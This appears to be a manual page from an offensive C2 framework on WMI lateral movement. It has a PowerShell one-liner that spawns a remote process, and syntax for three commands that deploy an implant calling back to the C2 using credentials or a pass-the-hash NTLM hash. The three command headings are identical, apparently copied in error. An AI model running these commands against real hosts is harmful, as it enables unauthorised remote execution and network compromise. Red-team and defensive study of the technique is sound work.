#################
  WMI
#################
Mitre ATT&CK - `WMI <https://attack.mitre.org/wiki/Technique/T1047>`_

-----------------
Introduction
-----------------
Windows Management Instrumentation (WMI) is a set of specifications created by Microsoft for consolidating the management of Windows computer systems. WMI has the ability to query almost everything about the Windows operating system including windows event logs, making system registry changes and worst of all, executing commands. It has been deemed a typical attack vector for malicious adversaries to utilise WMI for lateral movement and should be locked down accordingly. It should also be noted that other than the initial logon event that is generated, WMI leaves little evidence on the accessed system.

Not only can this be exploited remotely, all the tools required to perform this attack come as standard with every Windows operating system. One of the tools is ``wbemtest`` which is a WMI testing tool that allows users to execute WMI queries. Another tool is ``wmic`` and there is also PowerShell which by default also has the ability to perform these queries and could be easily weaponised in a simple script.

To demonstrate the simplicity of this attack, the following command shows how simple it is to start a new process remotely using PowerShell. It should be noted that the account used to perform the attack would need to have local administrator privileges on the remote host for this to be successful. Additionally, if Windows User Account Control was enforced on the remote host, this type of attack would not be successful by a local user account but would work on a domain level account.

.. code-block:: powershell

	Invoke-WmiMethod -Path Win32_process -Name create -ComputerName 'IPAddress' -ArgumentList 'CMD'


-----------------
Syntax
-----------------

**WMI Exec using the normal comms method back to the C2**

.. code-block:: powershell

	Invoke-WMIPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>

**WMI Exec using the normal comms method back to the C2**

.. code-block:: powershell

	Invoke-WMIProxyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>

**WMI Exec using the normal comms method back to the C2**

.. code-block:: powershell

	Invoke-WMIDiasyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>

-----------------
Parameters
-----------------

- **-Target** the IP of the machine to be targeted 
- **-Domain** Domain of user account to be used to exec payload
- **-User** Username
- **-Pass** Password 
- **-Hash (Optional)** The NTLM hash (in LM:NTLM or NTLM format) to be used as authentication instead of -Domain, -User and -pass
